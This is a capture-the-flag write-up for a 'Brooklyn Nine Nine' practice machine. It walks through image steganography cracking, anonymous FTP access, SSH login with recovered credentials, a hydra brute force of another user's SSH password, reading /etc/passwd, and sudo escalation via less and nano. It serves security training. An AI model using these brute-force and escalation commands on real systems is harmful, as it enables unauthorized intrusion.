There are lots of juicy information about it, an `Apache web-server(80)`, `Anonymous FTP` and `SSH`.

Let’s go through each ports one by one.

```PORT 80 - WEBSERVER```

Greeted with a B99 banner! Noice!
Looking at the source code, we find out the image name and download the image using wget http://IP/brooklyn99.jpg. There are abundance of hints, like Have you ever heard of steganography?

So we shall, use stegcracker to get the hidden data from the image,
```
$ stegcracker brooklyn99.jpg ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/home/cardinal/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt'..
Successfully cracked file with password: admin
Tried 1588 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

And we have set of credentials, that looks like could be used by SSH,
```
$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

```PORT 21 - Anonymous FTP```
Using the Anonymous FTP credentails, `anonymous` as username and password! We get a `note_to_jake.txt` from FTP server. And it contains a sweet text from Amy,

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
```PORT 22 - SSH```
Let’s try and get into SSH using the credentials `holt` as username and `fluffydog12@ninenine` as password!

We got two files in the default directory and one of them is `user.txt` and `nano.save` but it can be accessed by root, hence we have the user’s flag! Let’s enumerate more, so getting the `/etc/passwd` gives us that we have two more potential account - `jake` & `amy`.

Let’s try and get into jake’s account using bruteforce, for bruteforce we could use `hydra`.

```
$ hydra -l jake -P ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://IP
[22][ssh] host: IP   login: jake   password: 987654321
```
And we have jake’s password!!!! Let’s meet jake then!!!!
After getting into jake’s machine and we see it’s sudo privileges by `sudo -l` and we can see that jake has sudo privileges for `less`, and using it we can access the `root.txt` from root user.

```
$ less root/root.txt

Congratulations in rooting Brooklyn Nine Nine
Here is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxx

Enjoy!!
```
And we have pwned the box!!!

### Other Method
```
hen we do, `sudo -l` in holt’s account, we find out that we have sudo privileges for nano. And we could escalate using nano as well.
```
